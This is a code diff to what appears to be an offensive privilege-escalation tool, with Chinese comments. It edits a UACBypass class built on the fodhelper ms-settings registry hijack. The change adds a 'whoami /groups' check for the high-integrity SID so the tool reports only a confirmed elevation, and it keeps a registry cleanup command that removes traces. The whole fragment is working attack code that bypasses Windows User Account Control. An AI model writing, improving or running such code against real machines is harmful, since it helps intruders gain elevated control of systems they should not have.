@@ -286,6 +286,15 @@ class UACBypass:
             # 等待执行
             time.sleep(2)
 
+            # 验证提权是否成功 — 检查是否有以高权限运行的进程
+            verify_result = subprocess.run(
+                ["cmd", "/c", "whoami /groups | findstr /i S-1-16-12288"],
+                capture_output=True,
+                text=True,
+                timeout=10,
+            )
+            elevated = "S-1-16-12288" in (verify_result.stdout or "")
+
             # 清理注册表
             subprocess.run(
                 ["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"],
@@ -294,11 +303,11 @@ class UACBypass:
             )
 
             return EscalationResult(
-                success=True,
+                success=elevated,
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
-                to_level=PrivilegeLevel.HIGH,
-                output=f"fodhelper bypass executed: {command}",
+                to_level=PrivilegeLevel.HIGH if elevated else PrivilegeLevel.MEDIUM,
+                output=f"fodhelper bypass {'succeeded' if elevated else 'executed but not verified'}: {command}",
                 cleanup_command="reg delete HKCU\\Software\\Classes\\ms-settings /f",
             )
 
